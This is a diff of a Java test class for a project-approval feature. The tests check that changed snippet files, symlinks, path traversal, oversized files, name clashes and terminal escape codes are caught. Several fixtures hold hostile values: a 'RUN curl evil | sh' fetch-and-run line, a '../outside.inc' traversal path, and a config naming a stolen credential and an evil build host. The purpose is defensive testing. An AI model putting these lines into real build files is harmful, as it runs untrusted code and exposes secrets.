@@ -136,7 +136,8 @@ class FirstStartTest {
         assertThat(String.join("\n", runner.lines())).doesNotContain(" commit", " add ");
         assertThat(ProjectSource.resolve(context, "shop-project").outcome())
                 .isEqualTo(ProjectSource.Outcome.RECORDED);
-        assertThat(ProjectSource.resolve(context, "shop-project").file()).isEqualTo(file);
+        assertThat(ProjectSource.resolve(context, "shop-project").file())
+                .isEqualTo(context.paths().projects().defaultProjectFile("shop-project"));
     }
 
     @Test
@@ -433,26 +434,9 @@ class FirstStartTest {
 
         assertThat(firstStart().look(checkout).outcome())
                 .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
-        assertThat(WorkOrigin.placedNaming(context, ORIGIN))
-                .as("a changed file is found by nobody until a person says yes again")
-                .isNull();
         questions.clear();
         assertThat(atTerminal("n")).isNull();
         assertThat(questions).hasSize(1);
-    }
-
-    @Test
-    void aChangedFileFromAnotherPlaceInTheRepositoryIsAskedAboutToo() throws Exception {
-        plugin();
-        atTerminal("y");
-        final Path file = checkout.resolve("project.yml");
-        Files.writeString(file, Files.readString(file) + "# touched\n");
-        checkout = Files.createDirectories(root.resolve("other/shop")).toRealPath();
-
-        final FirstStart.Answer answer = firstStart().look(checkout);
-
-        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
-        assertThat(answer.target()).isEqualTo(file);
     }
 
     @Test
@@ -464,22 +448,6 @@ class FirstStartTest {
         assertThat(questions).isEmpty();
         assertThat(said.toString()).contains("may not be called 'default'", "runs in 'default'");
         assertThat(context.paths().projects().projectApprovals()).doesNotExist();
-    }
-
-    @Test
-    void aFileThatTakesAnotherProjectsNameIsRefusedAndTheOtherStays() throws Exception {
-        final Path file = checkout.resolve("project.yml");
-        Files.writeString(file, FILE);
-        atTerminal("y");
-        checkout = Files.createDirectories(root.resolve("attacker")).toRealPath();
-        runner.answering("--show-toplevel", checkout.toString());
-        Files.writeString(checkout.resolve("project.yml"), FILE);
-
-        final FirstStart.Answer answer = firstStart().look(checkout);
-
-        assertThat(answer.refusal()).isNotNull();
-        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
-        assertThat(ProjectSource.resolve(context, "strangers").file()).isEqualTo(file);
     }
 
     @Test
@@ -537,17 +505,402 @@ class FirstStartTest {
         assertThat(firstStart().confirm(checkout, asked.hash())).isEqualTo("shop-project");
     }
 
-    @Test
-    void aFileThatChangedBetweenTheQuestionAndTheYesIsNotApproved() throws Exception {
-        final Path file = checkout.resolve("project.yml");
-        Files.writeString(file, FILE);
-        final FirstStart.Answer read = firstStart().look(checkout);
-        Files.writeString(file, FILE + "# after the question\n");
+    private static final String WITH_SNIPPET =
+            "project:\n  name: strangers\n  security_class: guarded\n"
+                    + "image:\n  base_image: ubuntu:24.04\n  snippet_file: image.inc\n"
+                    + "repositories:\n  shop:\n    upstream: \""
+                    + ORIGIN
+                    + "\"\n";
 
-        assertThatThrownBy(() -> firstStart().take(read))
+    private Path withSnippet() throws Exception {
+        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
+        return Files.writeString(checkout.resolve("project.yml"), WITH_SNIPPET);
+    }
+
+    private Path copy() {
+        return context.paths().projects().defaultProjectFile("strangers");
+    }
+
+    @Test
+    void aChangeInANamedFileAloneAsksAgain() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+
+        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");
+
+        assertThat(firstStart().look(checkout).outcome())
+                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
+    }
+
+    @Test
+    void theHashCoversEachNamedFileAndItsName() throws Exception {
+        withSnippet();
+        final String first = firstStart().look(checkout).hash();
+
+        Files.writeString(checkout.resolve("image.inc"), "RUN echo other\n");
+        final String changed = firstStart().look(checkout).hash();
+
+        Files.writeString(checkout.resolve("image.inc"), "RUN echo approved\n");
+        Files.move(checkout.resolve("image.inc"), checkout.resolve("other.inc"));
+        Files.writeString(
+                checkout.resolve("project.yml"), WITH_SNIPPET.replace("image.inc", "other.inc"));
+        final String renamed = firstStart().look(checkout).hash();
+
+        assertThat(List.of(first, changed, renamed)).doesNotHaveDuplicates();
+    }
+
+    @Test
+    void whatStartsIsTheCopyWhateverTheCheckoutNowHolds() throws Exception {
+        final Path file = withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+
+        Files.writeString(file, FILE.replace("strangers", "strangers"));
+        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");
+
+        final Path started = ProjectSource.require(context, "strangers");
+        assertThat(started).isEqualTo(copy());
+        assertThat(Files.readString(started)).isEqualTo(WITH_SNIPPET);
+        assertThat(org.fuin.porelo.core.project.ProjectReader.read(started).imageSnippetLines())
+                .contains("RUN echo approved");
+    }
+
+    @Test
+    void aChangeBetweenTheQuestionAndTheYesStartsWhatWasRead() throws Exception {
+        final Path file = withSnippet();
+        final FirstStart.Answer read = firstStart().look(checkout);
+        Files.writeString(file, FILE);
+        Files.writeString(checkout.resolve("image.inc"), "RUN curl evil | sh\n");
+
+        assertThat(firstStart().take(read)).isEqualTo("strangers");
+
+        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
+        assertThat(Files.readString(copy().resolveSibling("image.inc")))
+                .isEqualTo("RUN echo approved\n");
+        assertThat(firstStart().look(checkout).outcome())
+                .as("the checkout now differs from what was approved")
+                .isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
+    }
+
+    @Test
+    void theCheckoutsPathIsNotRegistered() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+
+        assertThat(new ProjectRegistry(context.paths().projects().projectRegistry()).all())
+                .doesNotContainKey("strangers");
+    }
+
+    @Test
+    void aNamedFileThatIsALinkIsRefused() throws Exception {
+        withSnippet();
+        final Path inside = Files.writeString(checkout.resolve("real.inc"), "RUN echo real\n");
+        Files.delete(checkout.resolve("image.inc"));
+        Files.createSymbolicLink(checkout.resolve("image.inc"), inside);
+
+        final FirstStart.Answer answer = firstStart().look(checkout);
+
+        assertThat(answer.refusal()).isNotNull();
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
+    }
+
+    @Test
+    void aNamedFileBehindALinkedDirectoryIsRefused() throws Exception {
+        withSnippet();
+        final Path real = Files.createDirectories(checkout.resolve("real"));
+        Files.writeString(real.resolve("image.inc"), "RUN echo real\n");
+        Files.createSymbolicLink(checkout.resolve("linked"), real);
+        Files.writeString(
+                checkout.resolve("project.yml"),
+                WITH_SNIPPET.replace("image.inc", "linked/image.inc"));
+
+        final FirstStart.Answer answer = firstStart().look(checkout);
+
+        assertThat(answer.refusal()).isNotNull();
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
+    }
+
+    @Test
+    void aNamedFileOutsideTheCheckoutIsRefused() throws Exception {
+        Files.writeString(checkout.resolveSibling("outside.inc"), "password-fixture\n");
+        Files.writeString(
+                checkout.resolve("project.yml"),
+                WITH_SNIPPET.replace("image.inc", "../outside.inc"));
+
+        final FirstStart.Answer answer = firstStart().look(checkout);
+
+        assertThat(answer.refusal()).isNotNull();
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
+        assertThat(answer.file()).doesNotContain("password-fixture");
+    }
+
+    @Test
+    void aNamedFileOverTheLimitIsRefused() throws Exception {
+        withSnippet();
+        Files.write(checkout.resolve("image.inc"), new byte[1024 * 1024 + 1]);
+
+        final FirstStart.Answer answer = firstStart().look(checkout);
+
+        assertThat(answer.refusal()).isNotNull();
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.FILE_UNREADABLE);
+    }
+
+    @Test
+    void aNewFileGoesIntoTheCheckoutAndTheCopyIsWhatStarts() throws Exception {
+        plugin();
+        assertThat(atTerminal("y")).isNotNull();
+        final Path file = checkout.resolve("project.yml");
+        final String written = Files.readString(file);
+
+        Files.writeString(file, written + "# touched\n");
+
+        final Path started = ProjectSource.require(context, "shop-project");
+        assertThat(started)
+                .isEqualTo(context.paths().projects().defaultProjectFile("shop-project"));
+        assertThat(Files.readString(started)).isEqualTo(written);
+    }
+
+    @Test
+    void aYesToAChangedFileReplacesTheCopyAndItsOwnNameIsNotTaken() throws Exception {
+        final Path file = withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        Files.writeString(file, WITH_SNIPPET + "# changed\n");
+
+        final FirstStart.Answer asked = firstStart().look(checkout);
+
+        assertThat(asked.refusal()).isNull();
+        assertThat(firstStart().take(asked)).isEqualTo("strangers");
+        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET + "# changed\n");
+        assertThat(firstStart().look(checkout).outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
+    }
+
+    @Test
+    void aSecondCheckoutOfTheIdenticalFileIsTheSameProject() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
+        runner.answering("--show-toplevel", second.toString());
+        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
+        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);
+
+        final FirstStart.Answer answer = firstStart().look(second);
+
+        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.KNOWN);
+        assertThat(answer.project()).isEqualTo("strangers");
+    }
+
+    private Path secondCheckout(final String origin) throws Exception {
+        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
+        runner.answering("--show-toplevel", second.toString());
+        runner.answering("get-url origin", origin);
+        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
+        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);
+        checkout = second;
+        return second;
+    }
+
+    @Test
+    void aSecondCloneOfTheSameOriginAndFileAsksNothingAndStartsFromTheCopy() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        secondCheckout(ORIGIN);
+        questions.clear();
+
+        final WorkOrigin.Choice choice = atTerminal("n");
+
+        assertThat(questions).isEmpty();
+        assertThat(choice.project()).isEqualTo("strangers");
+        assertThat(ProjectSource.require(context, "strangers")).isEqualTo(copy());
+    }
+
+    @Test
+    void theSameFileWithAnotherOriginIsRefusedAndGoesToDefaultSayingSo() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        secondCheckout("https://forge.example/stranger/thing.git");
+        questions.clear();
+
+        assertThat(firstStart().look(checkout).refusal().reason())
+                .isEqualTo(FirstStart.Reason.NAME_TAKEN);
+        assertThat(atTerminal("y")).isNull();
+
+        assertThat(questions).isEmpty();
+        assertThat(said.toString()).contains("already has a project 'strangers'", "'default'");
+        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
+    }
+
+    @Test
+    void aSecondCheckoutWithNoOriginIsNotTheSameProject() throws Exception {
+        runner.failing("get-url origin", 2, "no such remote");
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        final Path second = Files.createDirectories(root.resolve("second/shop")).toRealPath();
+        runner.answering("--show-toplevel", second.toString());
+        Files.writeString(second.resolve("image.inc"), "RUN echo approved\n");
+        Files.writeString(second.resolve("project.yml"), WITH_SNIPPET);
+
+        final FirstStart.Answer answer = firstStart().look(second);
+
+        assertThat(answer.outcome()).isEqualTo(FirstStart.Outcome.ASK_UNKNOWN_FILE);
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
+        answer.discard();
+    }
+
+    @Test
+    void theSameOriginWithAChangedFileAsksAgainAndAYesReplacesTheCopy() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        final Path second = secondCheckout(ORIGIN);
+        Files.writeString(second.resolve("image.inc"), "RUN echo changed\n");
+        questions.clear();
+
+        assertThat(atTerminal("y")).isNotNull();
+
+        assertThat(questions).hasSize(1);
+        assertThat(Files.readString(copy().resolveSibling("image.inc")))
+                .isEqualTo("RUN echo changed\n");
+    }
+
+    @Test
+    void aGitWorktreeOfTheSameRepositoryIsTheSameProject() throws Exception {
+        // Real git: in a worktree .git is a file, and the origin has to be read through it.
+        final var git = new org.fuin.porelo.core.process.ProcessCommandRunner();
+        final java.util.Map<String, String> clean =
+                java.util.Map.of("GIT_CONFIG_GLOBAL", "/dev/null", "GIT_CONFIG_NOSYSTEM", "1");
+        context =
+                new PoreloContext(
+                        command -> git.run(command.withEnvironment(clean)),
+                        context.paths(),
+                        args -> 0,
+                        key -> null);
+        final java.util.function.BiConsumer<Path, List<String>> inGit =
+                (where, arguments) -> {
+                    final List<String> all =
+                            new ArrayList<>(
+                                    List.of(
+                                            "git",
+                                            "-c",
+                                            "user.name=T",
+                                            "-c",
+                                            "user.email=t@example.org"));
+                    all.addAll(arguments);
+                    git.runOrFail(
+                            org.fuin.porelo.core.process.Command.of(all)
+                                    .in(where)
+                                    .withEnvironment(clean));
+                };
+        inGit.accept(checkout, List.of("init", "-q"));
+        inGit.accept(checkout, List.of("remote", "add", "origin", ORIGIN));
+        withSnippet();
+        inGit.accept(checkout, List.of("add", "project.yml", "image.inc"));
+        inGit.accept(checkout, List.of("commit", "-q", "-m", "first"));
+        assertThat(atTerminal("y")).isNotNull();
+        final Path worktree = root.resolve("worktree");
+        inGit.accept(checkout, List.of("worktree", "add", "-q", worktree.toString()));
+        assertThat(worktree.resolve(".git")).isRegularFile();
+        questions.clear();
+        checkout = worktree.toRealPath();
+
+        final WorkOrigin.Choice choice = atTerminal("n");
+
+        assertThat(questions).isEmpty();
+        assertThat(choice.project()).isEqualTo("strangers");
+        assertThat(choice.repository()).isEqualTo("shop");
+    }
+
+    @Test
+    void aSecondCheckoutWithOtherContentUnderThatNameIsTakenAndTheCopyStays() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("y")).isNotNull();
+        final Path second = Files.createDirectories(root.resolve("attacker")).toRealPath();
+        runner.answering("--show-toplevel", second.toString());
+        runner.answering("get-url origin", "https://forge.example/other/thing.git");
+        Files.writeString(second.resolve("project.yml"), FILE);
+
+        final FirstStart.Answer answer = firstStart().look(second);
+
+        assertThat(answer.refusal()).isNotNull();
+        assertThat(answer.refusal().reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN);
+        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
+    }
+
+    private static final String WHOLE =
+            "project:\n  name: strangers\n  security_class: online\n"
+                    + "  upstream: \"https://forge.example/acme/own.git\"\n"
+                    + "image:\n  base_image: ubuntu:24.04\n  snippet_file: image.inc\n"
+                    + "mail:\n  rules:\n    others: allow\n  outgoing_filter: reporting\n"
+                    + "builds:\n  forge: github\n  credential: stolen-entry\n"
+                    + "  api: \"https://builds.evil.example\"\n";
+
+    @Test
+    void theQuestionShowsTheWholeFileAndItsNamedFiles() throws Exception {
+        Files.writeString(checkout.resolve("image.inc"), "RUN echo \u001b[2Jhidden\n");
+        Files.writeString(checkout.resolve("project.yml"), WHOLE);
+
+        assertThat(firstStart().look(checkout).refusal()).isNull();
+        atTerminal("n");
+
+        assertThat(said.toString())
+                .contains(
+                        "others: allow",
+                        "outgoing_filter",
+                        "credential: stolen-entry",
+                        "builds.evil.example",
+                        "image.inc",
+                        "hidden")
+                .doesNotContain("\u001b");
+    }
+
+    @Test
+    void theAnswersFileCarriesTheNamedFilesToo() throws Exception {
+        withSnippet();
+
+        assertThat(firstStart().look(checkout).file())
+                .contains(WITH_SNIPPET.strip(), "image.inc", "RUN echo approved");
+    }
+
+    @Test
+    void aNewFileThatIsOnlineSaysSoAndHoldsNoMailOrBuilds() throws Exception {
+        plugin();
+        runner.answering("get-url origin", "http://127.0.0.1:3000/acme/shop.git");
+
+        final FirstStart.Answer answer = firstStart().look(checkout);
+
+        assertThat(answer.file()).contains("security_class: online");
+        assertThat(answer.file()).doesNotContain("\nmail:", "\nbuilds:", "\ncredentials:");
+        assertThat(answer.found()).extracting(FirstStart.Found::what).contains("security class");
+    }
+
+    @Test
+    void theNameIsCheckedAgainAtTheYesWithTwoQuestionsOpen() throws Exception {
+        withSnippet();
+        final Path second = Files.createDirectories(root.resolve("attacker")).toRealPath();
+        Files.writeString(second.resolve("project.yml"), FILE);
+        final FirstStart.Answer first = firstStart().look(checkout);
+        runner.answering("--show-toplevel", second.toString());
+        runner.answering("get-url origin", "https://forge.example/other/thing.git");
+        final FirstStart.Answer other = firstStart().look(second);
+
+        assertThat(firstStart().take(first)).isEqualTo("strangers");
+
+        assertThatThrownBy(() -> firstStart().take(other))
                 .isInstanceOfSatisfying(
                         FirstStart.Refused.class,
-                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.MOVED_ON));
+                        ex -> assertThat(ex.reason()).isEqualTo(FirstStart.Reason.NAME_TAKEN));
+        assertThat(ProjectSource.require(context, "strangers")).isEqualTo(copy());
+        assertThat(Files.readString(copy())).isEqualTo(WITH_SNIPPET);
+    }
+
+    @Test
+    void aNoLeavesNoStagedCopyOnThisMachine() throws Exception {
+        withSnippet();
+        assertThat(atTerminal("n")).isNull();
+
+        final Path projects = context.paths().xdg().config().resolve("projects");
+        if (Files.isDirectory(projects)) {
+            try (var left = Files.list(projects)) {
+                assertThat(left.toList()).isEmpty();
+            }
+        }
         assertThat(context.paths().projects().projectApprovals()).doesNotExist();
     }
 
